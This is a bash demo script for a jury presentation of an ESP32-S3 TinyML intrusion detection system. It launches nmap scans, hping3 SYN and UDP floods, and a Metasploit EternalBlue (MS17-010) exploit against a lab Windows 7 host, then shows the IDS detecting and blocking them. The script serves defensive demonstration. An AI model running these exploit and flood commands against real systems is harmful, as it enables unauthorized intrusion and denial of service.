#!/bin/bash
# ╔════════════════════════════════════════════════════════════════╗
# ║         GuardNet IDS — Jury Demonstration Script              ║
# ║         ESP32-S3 TinyML Network Intrusion Detection           ║
# ╠════════════════════════════════════════════════════════════════╣
# ║  Run:     sudo bash ~/Desktop/demo.sh                         ║
# ║  Config:  /home/kali/guardnet.conf  (edit PAUSE_SECS there)  ║
# ╠════════════════════════════════════════════════════════════════╣
# ║  PAUSE_SECS=0   wait for Enter at each phase boundary         ║
# ║  PAUSE_SECS=N   auto-advance after N seconds (with countdown) ║
# ╚════════════════════════════════════════════════════════════════╝

# ─── Config ───────────────────────────────────────────────────
CONF="/home/kali/Desktop/guardnet.conf"
[ -f "$CONF" ] || CONF="/home/kali/guardnet.conf"
[ -f "$CONF" ] || CONF="${HOME}/Desktop/guardnet.conf"
[ -f "$CONF" ] && eval "$(grep -v '^\s*#' "$CONF" | grep '=' | sed 's/\s*#.*//')"

TARGET="${TARGET:-192.168.4.3}"
IDS_URL="${IDS_URL:-http://192.168.4.1}"
IDS_CREDS="${IDS_CREDS:-admin:admin}"
PAUSE_SECS="${PAUSE_SECS:-3}"
KALI_IP=$(ip -4 addr show eth1 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
KALI_IP="${KALI_IP:-192.168.4.5}"

# ─── Colours ──────────────────────────────────────────────────
BR='\e[1;31m'; BG='\e[1;32m'; BY='\e[1;33m'; BC='\e[1;36m'
C='\e[0;36m'; G='\e[0;32m'; Y='\e[1;33m'
BOLD='\e[1m'; DIM='\e[2m'; RESET='\e[0m'

# ─── UI ───────────────────────────────────────────────────────
hdr() {
    echo -e "\n${BOLD}${BC}╔══════════════════════════════════════════════════════╗${RESET}"
    printf "${BOLD}${BC}║  %-52s║${RESET}\n" "$*"
    echo -e "${BOLD}${BC}╚══════════════════════════════════════════════════════╝${RESET}\n"
}

phase()  { echo -e "\n  ${BOLD}${BY}▶  $*${RESET}\n"; }
info()   { echo -e "  ${C}[*]${RESET} $*"; }
pass()   { echo -e "  ${BG}[+]${RESET} $*"; }
warn()   { echo -e "  ${Y}[!]${RESET} $*"; }

# Jury talking-point box
jury() {
    echo ""
    echo -e "  ${BOLD}${BY}╔═ JURY TALKING POINT ══════════════════════════════════╗${RESET}"
    while IFS= read -r line; do
        printf "  ${BOLD}${BY}║${RESET} %-54s ${BOLD}${BY}║${RESET}\n" "$line"
    done <<< "$*"
    echo -e "  ${BOLD}${BY}╚═══════════════════════════════════════════════════════╝${RESET}"
}

pause() {
    echo ""
    if [ "${PAUSE_SECS:-0}" -eq 0 ]; then
        printf "  ${DIM}─ Press ENTER to continue (auto-advance in 10s) ─${RESET} "
        read -t 10 -r || echo ""
    else
        for i in $(seq "$PAUSE_SECS" -1 1); do
            printf "  ${DIM}Continuing in %ds...${RESET}   \r" "$i"
            sleep 1
        done
        echo ""
    fi
    echo ""
}

# ─── ESP32 API ────────────────────────────────────────────────
api()      { curl -sf --max-time 5 --interface eth1 -u "$IDS_CREDS" "$@" 2>/dev/null; }
api_safe() { curl -sf --max-time 5 --interface eth1 -u "$IDS_CREDS" "$@" 2>/dev/null; }

ids_set()   { api -X POST "$IDS_URL/api/ids/toggle"   -H "Content-Type: application/json" -d "{\"enabled\":$1}" >/dev/null; }
block_set() { api -X POST "$IDS_URL/api/block/toggle" -H "Content-Type: application/json" -d "{\"enabled\":$1}" >/dev/null; }

reset_state() {
    api_safe -X POST "$IDS_URL/api/alerts/clear" >/dev/null 2>&1
    api_safe "$IDS_URL/api/blocked" 2>/dev/null \
    | python3 -c "
import sys,json,urllib.request,base64
try:
    creds=base64.b64encode(b'${IDS_CREDS}').decode()
    for b in json.load(sys.stdin):
        r=urllib.request.Request('${IDS_URL}/api/unblock',
            data=json.dumps({'ip':b['ip']}).encode(),
            headers={'Authorization':'Basic '+creds,'Content-Type':'application/json'},method='POST')
        urllib.request.urlopen(r, timeout=5)
        print(f'  Unblocked {b[\"ip\"]}')
except: pass
" 2>/dev/null
}

status() {
    local s; s=$(api_safe "$IDS_URL/api/status") || { warn "Dashboard unreachable"; return; }
    python3 - "$s" << 'PY'
import sys, json, re
s = json.loads(sys.argv[1])
# Inner column width between "│  Label:      " and closing "│"
W = 30
def pad(colored, width=W):
    visible = re.sub(r'\x1b\[[0-9;]*m', '', colored)
    return colored + ' ' * max(0, width - len(visible))
ids = pad('\033[1;32mON\033[0m' if s['ids_enabled'] else '\033[1;31mOFF\033[0m')
blk = pad('\033[1;32mON\033[0m' if s['block_enabled'] else '\033[1;33mOFF\033[0m')
atk = pad(f"\033[1;33m{s['total_attacks']}\033[0m" if s['total_attacks'] else "\033[2m0\033[0m")
bld = pad(f"\033[1;31m{s['blocked']} IP(s)\033[0m" if s['blocked'] else "\033[2m0\033[0m")
u = s['uptime']; uptime = f"{u//3600}h {u%3600//60}m {u%60}s"
inf = s['avg_inference_us']
inf_str = f"{inf:.0f}µs" if inf < 1000 else f"{inf/1000:.1f}ms"
upt = pad(f"\033[0;36m{uptime}\033[0m")
inf_p = pad(f"\033[0;36m{inf_str}\033[0m")
title = pad("\033[1mGuardNet ESP32-S3\033[0m")
print(f"\n  ┌──────────────────────────────────────────────┐")
print(f"  │  {title}│")
print(f"  │  Uptime:      {upt}│")
print(f"  │  IDS:         {ids}│")
print(f"  │  Blocking:    {blk}│")
print(f"  │  Attacks:     {atk}│")
print(f"  │  Blocked IPs: {bld}│")
print(f"  │  Inference:   {inf_p}│")
print(f"  └──────────────────────────────────────────────┘\n")
PY
}

show_detections() {
    local r; r=$(api_safe "$IDS_URL/api/alerts") || return
    local n; n=$(echo "$r" | python3 -c "import sys,json;print(len(json.load(sys.stdin)))" 2>/dev/null)
    [ "${n:-0}" -eq 0 ] && return
    echo -e "  ${BY}Detections:${RESET}"
    echo "$r" | python3 -c "
import sys,json
for a in reversed(json.load(sys.stdin)[-6:]):
    conf=int(a['conf']*100)
    bar='█'*(conf//10)+'░'*(10-conf//10)
    src,dst,cat=a['src'],a['dst'],a['cat']
    print(f'    \033[1;31m{cat:<14}\033[0m {src} → {dst}  [{bar}] {conf}%')
" 2>/dev/null
}

show_blocked() {
    local r; r=$(api_safe "$IDS_URL/api/blocked") || return
    echo "$r" | python3 -c "
import sys,json
bl=json.load(sys.stdin)
if not bl: print('  \033[2m(no blocked IPs)\033[0m'); exit()
for b in bl:
    rem=b.get('remaining',-1)
    t=f'{rem//60}m {rem%60}s' if rem>0 else ('∞' if rem<0 else 'expiring...')
    print(f'    \033[1;31m✗  {b[\"ip\"]:<18} [{b[\"reason\"]}]  {t}\033[0m')
" 2>/dev/null
}

watch_alerts() {
    local secs="${1:-15}" seen=0 end=$((SECONDS+secs))
    info "Live detection feed (${secs}s)..."
    while [ $SECONDS -lt $end ]; do
        local r n
        r=$(api_safe "$IDS_URL/api/alerts" 2>/dev/null) || break
        n=$(echo "$r" | python3 -c "import sys,json;print(len(json.load(sys.stdin)))" 2>/dev/null || echo 0)
        if [ "$n" -gt "$seen" ]; then
            echo "$r" | python3 -c "
import sys,json
for a in json.load(sys.stdin)[$seen:]:
    conf=int(a['conf']*100)
    bar='█'*(conf//10)+'░'*(10-conf//10)
    print(f'    \033[1;31m[DETECT]\033[0m \033[1m{a[\"cat\"]:<14}\033[0m {a[\"src\"]} → {a[\"dst\"]}  [{bar}] {conf}%')
" 2>/dev/null
            seen=$n
        fi
        sleep 2
    done
}

kali_blocked() {
    api_safe "$IDS_URL/api/blocked" 2>/dev/null \
    | python3 -c "
import sys,json
exit(0 if any(x['ip']=='${KALI_IP}' for x in json.load(sys.stdin)) else 1)
" 2>/dev/null
}

ensure_blocked() {
    # Run portscan until Kali is blocked, max 3 attempts
    for attempt in 1 2 3; do
        if kali_blocked; then
            pass "Kali ($KALI_IP) confirmed in ESP32 block list"; return 0
        fi
        info "Attempt $attempt — port scan to trigger detection..."
        nmap -sS -T4 --top-ports 500 "$TARGET" &>/dev/null
        sleep 2
    done
    if ! kali_blocked; then
        warn "Not blocked after 3 attempts — running SYN flood..."
        timeout 8 hping3 -S -i u1000 -p 445 "$TARGET" &>/dev/null || true
        sleep 2
    fi
    kali_blocked && pass "Kali ($KALI_IP) blocked" || warn "Block may not have fired — check dashboard"
}

# ─── EternalBlue ──────────────────────────────────────────────
# Uses windows/x64/exec — fire-and-forget, no reverse shell needed.
# Writes a text file to C:\Users\Public\Desktop\
eternalblue_drop() {
    local label="$1"
    local fname="GUARDNET_${label}.txt"
    # Use powershell to write a multi-line marker file. No spaces inside args that could confuse msf parser.
    local cmd="cmd.exe /c echo GuardNet-${label}>C:\\Users\\Public\\Desktop\\${fname}"

    info "MS17-010 EternalBlue (CVE-2017-0144) — exec payload → Win7 Desktop..."
    if ! command -v msfconsole &>/dev/null; then
        warn "msfconsole not found — skipping EternalBlue"; return 1
    fi

    local out
    out=$(timeout 90 msfconsole -q -x "
        use exploit/windows/smb/ms17_010_eternalblue
        set RHOSTS ${TARGET}
        set PAYLOAD windows/x64/exec
        set CMD ${cmd}
        set ConnectTimeout 10
        set EXITFUNC thread
        set ExitOnSession true
        exploit
        exit -y
    " 2>&1)

    # Strong success: 'WIN' marker or 'execution completed' from msf eternalblue
    if echo "$out" | grep -qE "=-=WIN-=-=|command execution completed|ETERNALBLUE overwrite completed"; then
        echo -e "  ${BG}[+]${RESET} Exploit SUCCEEDED on Win7 (${TARGET})"
        echo -e "  ${BY}    File: C:\\Users\\Public\\Desktop\\${fname}${RESET}"
        sleep 2
        return 0
    elif echo "$out" | grep -qiE "VULNERABLE"; then
        warn "Target is vulnerable but exploit did not finish cleanly"
        echo "$out" | grep -iE "VULNERABLE|failed|error|does not support" | head -5 || true
        return 1
    else
        warn "Exploit did not succeed — target may be patched or unreachable"
        echo "$out" | grep -iE "failed|error|refused|timeout|unreach" | head -5 || true
        return 1
    fi
}

# ─── Startup ──────────────────────────────────────────────────
clear
echo -e "${BOLD}${BC}"
cat << 'BANNER'
   ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗ ███╗   ██╗███████╗████████╗
  ██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔════╝╚══██╔══╝
  ██║  ███╗██║   ██║███████║██████╔╝██║  ██║██╔██╗ ██║█████╗     ██║
  ██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║██║╚██╗██║██╔══╝     ██║
  ╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝██║ ╚████║███████╗   ██║
   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝
BANNER
echo -e "${RESET}"
echo -e "  ${BOLD}TinyML Network Intrusion Detection — ESP32-S3${RESET}"
echo -e "  ${DIM}Attacker: ${KALI_IP}  │  Target Win7: ${TARGET}  │  IDS: ${IDS_URL}${RESET}"
echo -e "  ${DIM}Pause mode: $([ "${PAUSE_SECS:-0}" -eq 0 ] && echo 'manual (Enter)' || echo "${PAUSE_SECS}s auto-advance")${RESET}"
echo ""

# Guards
if [[ "$KALI_IP" != 192.168.4.* ]]; then
    echo -e "${BR}  FATAL: eth1 not on GuardNet (got: ${KALI_IP:-none})"
    echo -e "  Fix: sudo nmcli con mod 'Wired connection 2' ipv4.method manual ipv4.addresses '192.168.4.5/24' ipv4.gateway '' && sudo nmcli con up 'Wired connection 2'${RESET}"
    exit 1
fi
pass "Attacker IP (Kali eth1): $KALI_IP"

if ! api_safe "$IDS_URL/api/status" &>/dev/null; then
    echo -e "${BR}  FATAL: ESP32 not reachable at $IDS_URL — check WiFi${RESET}"; exit 1
fi
pass "ESP32 GuardNet online: $IDS_URL  (dashboard: admin/admin)"

if timeout 3 bash -c ": </dev/tcp/$TARGET/445" 2>/dev/null || ping -c 1 -W 2 "$TARGET" &>/dev/null; then
    pass "Windows 7 target $TARGET is online"
else
    warn "Win7 $TARGET not responding — continuing anyway"
fi

ids_set true; block_set false; reset_state
pass "State: IDS ON | Blocking OFF | Alerts cleared | All IPs unblocked"
status

jury "Point at the dashboard: http://192.168.4.1
IDS is ON, 0 attacks, 3–4 clients connected.
This is GuardNet — an ESP32-S3 acting as a WiFi AP that
inspects every packet with a TinyML neural network."

pause

# ══════════════════════════════════════════════════════════════
hdr "PHASE 1 — Network WITHOUT GuardNet"
# ══════════════════════════════════════════════════════════════

phase "Disabling IDS — the network is completely blind"
ids_set false; block_set false
status

info "Port scan — mapping open ports on Win7 (~20s)..."
timeout 25 nmap -sS -T4 --top-ports 100 --host-timeout 20s "$TARGET" -oN /tmp/demo_p1_scan.txt &>/dev/null || true
pass "Port scan complete — Win7 services mapped"

info "SYN flood — overwhelming Win7 with connection requests (~8s)..."
timeout 8 hping3 -S -i u1000 -p 445 "$TARGET" &>/dev/null || true
pass "SYN flood complete"

echo ""
phase "EternalBlue (MS17-010) — NSA exploit used in WannaCry"
echo -e "  ${DIM}  CVE-2017-0144  ·  SMBv1 heap spray  ·  remote code execution  ·  no password needed${RESET}"
echo ""
eternalblue_drop "OWNED"
echo ""

info "Checking GuardNet dashboard..."
status
echo ""
echo -e "  ${BR}  ► 0 detections. The attack was completely invisible.${RESET}"
echo -e "  ${DIM}     An attacker just exploited a critical vulnerability${RESET}"
echo -e "  ${DIM}     and you had no visibility whatsoever.${RESET}"

jury "Show Win7 Desktop — GUARDNET_OWNED.txt is there.
Show GuardNet dashboard — 0 attacks, IDS was OFF.
Key message: this is what most small networks look like.
No IDS, no visibility, no protection."

pause

# ══════════════════════════════════════════════════════════════
hdr "PHASE 2 — GuardNet Monitors Every Packet"
# ══════════════════════════════════════════════════════════════

phase "IDS ON — TinyML model classifying every flow in real time"
ids_set true; block_set false; reset_state
status

info "Running the same attacks — watch the IDS classify them..."
echo ""

nmap -sS -T4 --top-ports 500 "$TARGET" &>/dev/null &
SCAN_PID=$!
timeout 8 hping3 -S -i u1000 -p 445 "$TARGET" &>/dev/null &
FLOOD_PID=$!
watch_alerts 14
wait $SCAN_PID $FLOOD_PID 2>/dev/null

timeout 6 hping3 --udp -i u1000 -p 137 "$TARGET" &>/dev/null &
watch_alerts 8
wait 2>/dev/null

echo ""
info "Final detection summary:"
status
show_detections
echo ""
echo -e "  ${BY}  ► Every attack classified. PortScan, DoS, DDoS.${RESET}"
echo -e "  ${DIM}     30 flow features · INT8 quantized · 3-layer neural network${RESET}"
echo -e "  ${DIM}     ~1.5ms inference on ESP32-S3 · no cloud · no external service${RESET}"
echo -e "  ${DIM}     Attacker is still active — no blocking enabled yet.${RESET}"

jury "Show dashboard Live Attack Feed — attacks appear with category + confidence.
Point at inference time: ~1.5ms per classification on a $5 chip.
Key message: the IDS saw everything and classified it correctly.
Attack was detected but attacker is still active — next phase fixes that."

pause

# ══════════════════════════════════════════════════════════════
hdr "PHASE 3 — GuardNet Blocks the Attacker"
# ══════════════════════════════════════════════════════════════

phase "Blocking ON — detected IPs are firewalled at the packet hook"
ids_set true; block_set true; reset_state
status

info "Running attacks — GuardNet will block Kali the moment it detects..."
echo ""
ensure_blocked
echo ""

show_blocked
echo ""

phase "Proving the block works"
info "TCP connect from Kali eth1 to Win7:445..."
if ! timeout 3 bash -c "echo >/dev/tcp/$TARGET/445" 2>/dev/null; then
    echo -e "  ${BR}  ✗  BLOCKED — ESP32 dropped the packet before it reached Win7${RESET}"
    pass "Firewall confirmed active"
else
    warn "Still connecting — check dashboard Block is ON"
fi

info "Port scan from blocked IP..."
nmap -sS -T3 --top-ports 5 "$TARGET" 2>&1 | grep -E "filtered|Nmap done" | head -2 || true

echo ""
status; show_blocked; show_detections
echo ""
echo -e "  ${BG}  ► Attacker isolated. Every packet from $KALI_IP is silently dropped.${RESET}"
echo -e "  ${DIM}     Block runs in the lwIP input hook — zero CPU cost per dropped packet.${RESET}"
echo -e "  ${DIM}     Auto-unblocks after $(api_safe "$IDS_URL/api/status" 2>/dev/null | python3 -c "import sys,json;s=json.load(sys.stdin).get('block_timeout',300);print(f'{s//60}min')" 2>/dev/null).${RESET}"

jury "Show dashboard Blocked IPs — countdown timer visible.
Try opening Win7's SMB share from Kali — connection refused.
Key message: the ESP32 acts as a hardware firewall at line speed."

pause

# ══════════════════════════════════════════════════════════════
hdr "PHASE 4 — Same Exploit. GuardNet Active. Different Outcome."
# ══════════════════════════════════════════════════════════════

phase "Unblocking attacker — GuardNet IDS+Block ON — attempt #2"
reset_state; block_set true
status

echo -e "  ${DIM}  Same CVE-2017-0144. Same target. Same attacker. GuardNet is watching.${RESET}"
echo ""

info "Step 1 — reconnaissance triggers IDS immediately..."
ensure_blocked
show_blocked
echo ""

phase "EternalBlue attempt — attacker is already firewalled"
info "Step 2 — exploit fires, but every SMB packet from $KALI_IP is dropped..."
echo ""
eternalblue_drop "BLOCKED_ATTEMPT"
echo ""

info "IDS status:"
status; show_detections; show_blocked
echo ""

phase "The verdict — check Win7 Desktop"
echo -e "  ${DIM}  Phase 1 result:${RESET}  ${BR}GUARDNET_OWNED.txt${RESET}          ${BR}← EXISTS (attack succeeded)${RESET}"
echo -e "  ${DIM}  Phase 4 result:${RESET}  ${BG}GUARDNET_BLOCKED_ATTEMPT.txt${RESET}  ${BG}← DOES NOT EXIST (blocked)${RESET}"
echo ""
echo -e "  ${BG}  ► GuardNet stopped the exploit. Nothing new on Win7's Desktop.${RESET}"
echo -e "  ${BG}     The IDS detected reconnaissance → blocked the attacker →${RESET}"
echo -e "  ${BG}     exploit never reached its target.${RESET}"

jury "Show Win7 Desktop:
  GUARDNET_OWNED.txt      → there (Phase 1, no defense)
  GUARDNET_BLOCKED_ATTEMPT.txt → NOT there (Phase 4, GuardNet)
This is the entire point of the project in two files."

pause

# ══════════════════════════════════════════════════════════════
hdr "Reset"
# ══════════════════════════════════════════════════════════════

ids_set true; block_set false; reset_state
echo ""
echo -e "  ${BG}IDS ON | Blocking OFF | Unblocked | Alerts cleared${RESET}"
echo -e "  Dashboard: ${C}$IDS_URL${RESET}  (admin/admin)"
echo ""
